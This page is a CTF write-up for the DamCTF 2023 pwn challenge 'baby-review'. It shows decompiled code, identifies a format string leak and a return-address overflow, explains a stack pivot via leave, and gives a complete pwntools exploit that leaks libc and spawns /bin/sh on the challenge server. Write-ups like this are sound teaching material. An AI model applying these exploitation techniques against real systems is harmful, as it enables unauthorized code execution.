@@ -1,0 +1,275 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\DamCTF 2023">DamCTF 2023</a>
+            <a href="/CTF-writeups\DamCTF 2023\baby-review/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>baby-review</span>
+            <span class="text-right">[453]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>We are given a binary with a corresponding libc file.</p>
+<blockquote>
+<p>I've created a fun program for you to review your favorite movies and books. Can you figure out the problem with it?</p>
+<p><code>nc chals.damctf.xyz 30888</code></p>
+<p>Downloads<br />
+<a href="https://rctf-bucket.storage.googleapis.com/uploads/1b73a2a7dc7a506295798168b678a4a510a94b7cb536da5d0ca17398ef9e1235/baby-review">baby-review</a>, <a href="https://rctf-bucket.storage.googleapis.com/uploads/568740b06a8afa26db4874f8cf61985ecbc6dd127f4229416fe95da8f9ec13fb/libc.so.6">libc.so.6</a></p>
+</blockquote>
+<hr />
+<h3>Recon</h3>
+<p>First of all, as this exploit relies heavily on libc specific stack pointers, i will be using <a href="https://github.com/io12/pwninit">pwninit</a> to set everything up. It doesn't always work, and it can be done manually, but for this challenge, it seems to work.</p>
+<p>Jumping into code, we first inspect the main function:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">comp</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">time_t</span><span class="w"> </span><span class="n">curr_time</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">capital</span><span class="w"> </span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="n">undefined1</span><span class="w"> </span><span class="o">*</span><span class="n">country</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">randint</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">curr_time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">((</span><span class="kt">time_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">curr_time</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">load_countries</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alright I need to prove you</span><span class="se">\&#39;</span><span class="s">re human so lets do some geography&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">randint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span><span class="w"></span>
+<span class="w">  </span><span class="n">randint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">randint</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">num_countries</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">country</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">countries</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">randint</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">100</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;What is the capital of %s?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">country</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">capital</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strcspn</span><span class="p">(</span><span class="n">capital</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">capital</span><span class="p">[</span><span class="n">len</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strcmp</span><span class="p">(</span><span class="n">capital</span><span class="p">,</span><span class="n">country</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x32</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Correct!&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alright I</span><span class="se">\&#39;</span><span class="s">ll let you through&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">menu</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Incorrect. The capital of %s is %s.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">country</span><span class="p">,</span><span class="n">country</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x32</span><span class="p">);</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>An interesting twist, the program starts by asking for the capital of a country? I saw some people using specific libraries to get around this, but my solution just takes input from the user. Moving on to the menu function:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">movie</span><span class="w"> </span><span class="p">[</span><span class="mi">303</span><span class="p">];</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">choice</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">undefined</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="p">[</span><span class="mi">32</span><span class="p">];</span><span class="w"></span>
+
+<span class="w">  </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;What would you like to do?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;1. Read a book?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;2. Watch a movie?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;3. Review a book/movie&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;4. Exit&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot; %c&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">getchar</span><span class="p">();</span><span class="w"></span>
+<span class="w">    </span><span class="k">switch</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;1&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">read_book</span><span class="p">();</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;2&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">watch_movie</span><span class="p">(</span><span class="n">movie</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;3&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">review</span><span class="p">();</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;4&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Sad to see you go.&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Could I get your name for my records?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="mi">48</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;5&#39;</span><span class="o">:</span><span class="w"></span>
+<span class="w">      </span><span class="n">add_movie</span><span class="p">(</span><span class="n">movie</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">break</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">default</span><span class="o">:</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">      </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="w"> </span><span class="nb">true</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>So, we can either do <code>read_book</code>, <code>watch_movie</code>, <code>review</code> or <code>add_movie</code>. Interresting, the UI doesn't reveal the existence of <code>add_movie</code>. Let's check that out first.</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">add_movie</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">movie</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">comp</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter your movie link here and I</span><span class="se">\&#39;</span><span class="s">ll add it to the list&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">movie</span><span class="p">,</span><span class="mi">300</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">comp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strstr</span><span class="p">(</span><span class="n">movie</span><span class="p">,</span><span class="s">&quot;%n&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                    </span><span class="cm">/* WARNING: Subroutine does not return */</span><span class="w"></span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="p">}</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>The function simply fills the movie-buffer that we saw in menu. No overflow, however, the function does check for the pressence of "%n" in the input. This is weird, as this would usually be used in a format string exploit. Going back to menu, we check out the other function that uses the movie-buffer: <code>watch_movie</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">watch_movie</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">param_1</span><span class="p">)</span><span class="w"></span>
+
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00102078</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;https://www.youtube.com/watch?v=2bGvWEfLUsc&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;https://www.youtube.com/watch?v=0u1oUsPWWjM&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;https://www.youtube.com/watch?v=Icx4xul9LEE&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span><span class="w"></span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>An easy format string vulnerability. However, as we cannot use "%n", there will be no overwriting the GOT.  This would only be used as a leak.</p>
+<p>Jumping back up to <code>menu</code>, we see another potential vector:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Sad to see you go.&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;Could I get your name for my records?&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="mi">48</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+</code></pre></div>
+
+<p>The name-buffer is only 32 bytes long, so we have an overflow of 16 bytes, straight into a return. This is obviously the way we get code execution.</p>
+<hr />
+<h3>Pivoting the stack</h3>
+<p>Checking the disassembly, we can see the use of <code>leave</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="w">        </span><span class="mf">001015e4</span><span class="w"> </span><span class="n">c9</span><span class="w">              </span><span class="n">LEAVE</span><span class="w"></span>
+<span class="w">        </span><span class="mf">001015e5</span><span class="w"> </span><span class="n">c3</span><span class="w">              </span><span class="n">RET</span><span class="w"></span>
+</code></pre></div>
+
+<p>This can be both good and bad. <code>leave</code> as an instruction is quite simple, it pops <code>rbp</code> from the stack. This means, that while we have an overflow of 16 bytes, we can only call a single address. I tried experimenting with one-gadgets, but with the difference between local and remote, coupled with the quite modern libc version, none of the gadgets worked. Therefore, we must do something else.</p>
+<p>This is where <code>leave</code> comes in to save the day. <code>leave</code> as an instruction boils down to two steps:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">mov</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="no">rbp</span><span class="w"></span>
+<span class="nf">pop</span><span class="w"> </span><span class="no">rbp</span><span class="w"></span>
+</code></pre></div>
+
+<p>It first moves <code>rbp</code> to <code>rsp</code>, then it pops <code>rbp</code> from the stack. As we control the value popped from the stack, we can control <code>rbp</code>. If we were to call <code>leave</code> again, the program would move our attacker controlled <code>rbp</code> to <code>rsp</code>, giving us control of the stack pointer. We can then simply chose a value that points back to the beginning of our buffer, giving us space for a larger rop chain.</p>
+<hr />
+<h3>Solution</h3>
+<p>As we have been provided with the remote libc version, i simply chose to leak the stack and the libc base address. I tested with gdb that the provided stack values corresponded, as they often don't.</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./baby-review_patched&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/peda/peda.py&quot;</span>
+<span class="c1"># conn = gdb.debug(&quot;./baby-review_patched&quot;, &#39;&#39;&#39;</span>
+<span class="c1"># b *(&amp;menu+108)</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="c1"># conn = process(&quot;./baby-review_patched&quot;)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;chals.damctf.xyz&quot;</span><span class="p">,</span> <span class="mi">30888</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;-&gt; &quot;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;5&quot;</span><span class="p">)</span>  <span class="c1"># Navigate to add_movie</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;list</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;%3$p %7$p&quot;</span><span class="p">)</span>  <span class="c1"># libc pointer and stack pointer</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>  <span class="c1"># Navigate to watch_movie</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;EE</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Leak</span>
+<span class="n">libc_leak</span><span class="p">,</span> <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">leak</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; &quot;</span><span class="p">)</span>
+<span class="n">libc_leak</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">)</span>  <span class="c1"># libc pointer</span>
+<span class="n">stack_leak</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span>  <span class="c1"># stack pointer - 8 (leave; ret; increments it)</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">-</span> <span class="mi">23</span>  <span class="c1"># Seems to be correct both local and remote</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked libc base </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked pivot address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Exit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>  <span class="c1"># Navigate to exit</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)))</span>  <span class="c1"># Pointer to /bin/sh</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">])</span>  <span class="c1"># system</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span>  <span class="c1"># name - 8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x562ec</span><span class="p">)</span>  <span class="c1"># leave; ret;</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;?</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
